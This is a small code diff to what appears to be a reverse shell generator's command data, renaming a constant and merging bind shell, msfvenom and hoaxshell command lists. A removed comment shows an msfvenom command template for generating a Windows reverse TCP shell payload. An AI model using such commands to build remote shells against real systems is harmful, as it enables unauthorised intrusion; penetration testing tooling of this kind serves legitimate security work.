@@ -626,8 +626,7 @@ const hoaxShellCommands =  withCommandType(
 );
 
 // Shellcode generated with msfvenom (Metasploit Framework)
-// e.g. msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f c
-const AssembledCommands = withCommandType(
+const assembledCommands = withCommandType(
     CommandType.Assembled,
     [
         {
@@ -769,7 +768,7 @@ const rsgData = {
         ...bindShellCommands,
         ...msfvenomCommands,
         ...hoaxShellCommands,
-        ...AssembledCommands
+        ...assembledCommands
     ]
 };
 
